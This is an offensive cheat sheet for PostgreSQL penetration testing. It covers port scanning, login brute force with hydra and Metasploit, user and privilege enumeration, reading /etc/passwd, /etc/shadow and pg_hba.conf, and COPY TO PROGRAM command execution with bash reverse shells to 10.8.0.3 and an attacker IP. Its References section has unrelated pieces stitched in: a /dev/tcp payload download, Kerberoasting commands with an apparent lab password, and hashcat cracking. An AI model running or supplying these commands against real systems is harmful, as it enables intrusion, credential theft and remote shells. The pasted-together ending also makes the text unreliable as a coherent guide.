- [ ] PostgreSQL Footprinting
- [ ] PostgreSQL Login Brute Force
- [ ] PostgreSQL Connection -  Basic Commands
- [ ] PostgreSQL Database Enumeration
- [ ] PostgreSQL User - Privileges Enumeration
- [ ] PostgreSQL File Read -Write
- [ ] PostgreSQL COPY Command
- [ ] Pwn Postgres Shell - Postgres 9.3 and above
- [ ] PostgreSQL Exploits

PostgreSQL Footprinting!!!
```sh
nmap -p 5432 -sC -sV IP
```
PostgreSQL Login Brute Force!!!
```sh
# hydra
hydra -L users.txt -P passwords.txt IP postgres
hydra -l postgres -P passwords.txt IP postgres
# nmap
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt target.com
# msf
use auxiliary/scanner/postgres/postgres_login
```
PostgreSQL Connection -  Basic Commands!!!
```sh
SELECT version();
SHOW server_version;
SHOW server_version_num;
SELECT current_setting('server_version');
```
PostgreSQL Database Enumeration!!!
```sh
# All db
\l  
SELECT datname FROM pg_database;  
# Current database  
SELECT current_database();
```
PostgreSQL User - Privileges Enumeration!!!
```sh
# List all users
\du
SELECT usename FROM pg_user;
SELECT usename, usesysid FROM pg_shadow;
# Current user
SELECT current_user;
SELECT user;
SELECT session_user;
# User privileges
\du+
SELECT usename, usecreatedb, usesuper FROM pg_user;
# Superusers
SELECT usename FROM pg_user WHERE usesuper = true;
# Users with create database privilege
SELECT usename FROM pg_user WHERE usecreatedb = true;
```
PostgreSQL File Read -Write!!!
```sh
# File Read
SELECT has_function_privilege('pg_read_file(text)', 'execute');
SELECT pg_read_file('/etc/passwd');  
SELECT pg_read_file('../../../../../../etc/passwd');  
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');
SELECT pg_read_file(current_setting('hba_file'));
SELECT pg_read_binary_file('/etc/shadow');
# File Write 
SELECT has_function_privilege('pg_ls_dir(text)', 'execute');
SELECT pg_ls_dir('/var/www/html');
```
PostgreSQL COPY Command!!!
```sh
# File Read
CREATE TABLE temp_table(content text);
COPY temp_table FROM '/etc/passwd';
SELECT * FROM temp_table;
DROP TABLE temp_table;
# File WRite
COPY (SELECT 'bash -i >& /dev/tcp/10.8.0.3/4444 0>&1') TO '/tmp/x.sh';
# RCE
COPY (SELECT '') TO PROGRAM 'id > /tmp/command_output.txt';
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1';

COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/10.8.0.3/4444 0>&1';

COPY (SELECT '') TO PROGRAM 'bash /tmp/x.sh';
```
Pwn Postgres Shell - Postgres 9.3 and above!!!
```sh
pg_execute_server_program

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```
PostgreSQL Exploits!!!
```sh
# CVE-2019-9193: Authentication bypass via a rogue replica
https://github.com/paulotrindadec/CVE-2019-9193
https://www.exploit-db.com/exploits/50847
# CVE-2022-1552: SQL injection

# CVE-2023-39417: RCE through a crafted trigger function

```
References!!!
```
https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/


exec 3<>/dev/tcp/10.8.0.3/80 && echo -e "GET /payload.sh HTTP/1.1\r\nHost: 10.8.0.3\r\nConnection: close\r\n\r\n" >&3 && cat <&3 > /tmp/payload.sh



impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.144.122 -request


printf 'svc-document\n' > /tmp/silsila-targets.txt

impacket-GetUserSPNs -no-preauth r.benali \

  -usersfile /tmp/silsila-targets.txt -dc-ip "$DC" \

  -outputfile /tmp/silsila-service.hash "$DOMAIN/"

if [ -f /usr/share/wordlists/rockyou.txt ]; then

  head -n 2000 /usr/share/wordlists/rockyou.txt > /tmp/rockyou-2000.txt

else

  zcat /usr/share/wordlists/rockyou.txt.gz | head -n 2000 > /tmp/rockyou-2000.txt

fi

hashcat -m 19700 /tmp/silsila-service.hash /tmp/rockyou-2000.txt

hashcat -m 19700 /tmp/silsila-service.hash –show
```